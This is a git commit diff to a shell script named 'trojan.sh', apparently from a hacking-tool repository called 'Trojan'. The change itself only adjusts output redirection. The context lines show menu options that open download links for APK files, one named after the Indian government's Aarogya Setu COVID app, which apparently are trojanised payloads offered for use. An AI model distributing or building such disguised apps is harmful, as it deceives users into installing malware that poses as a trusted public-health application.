95ef6b5980c9b15d320361961e977df1e366e09b
ABHacker Official <63346676+abhackerofficial@users.noreply.github.com>
2020-06-15 07:31:11 +0530

    Update trojan.sh

--- trojan.sh
+++ trojan.sh
@@ -56,13 +56,13 @@ if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
 sleep 0.8
 echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 100
 xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
-else cd - && bash trojan.sh > /dev/null 2>&1
+else cd - > /dev/null 2>&1 && bash trojan.sh
 fi
 echo
 sleep 1.0
 printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
 read a1
-cd - && bash trojan.sh > /dev/null 2>&1
+cd - > /dev/null 2>&1 && bash trojan.sh
 
         elif [[ $char = "2" ]] || [[ $char = "02" ]]
         then echo
@@ -79,13 +79,13 @@ if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
 sleep 0.8
 echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 
 xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
-else cd - && bash trojan.sh > /dev/null 2>&1
+else cd - > /dev/null 2>&1 && bash trojan.sh
 fi
 echo
 sleep 1
 printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
 read a1
-cd - && bash trojan.sh > /dev/null 2>&1
+cd - > /dev/null 2>&1 && bash trojan.sh
 
         elif [[ $char = "3" ]] || [[ $char = "03" ]]
         then
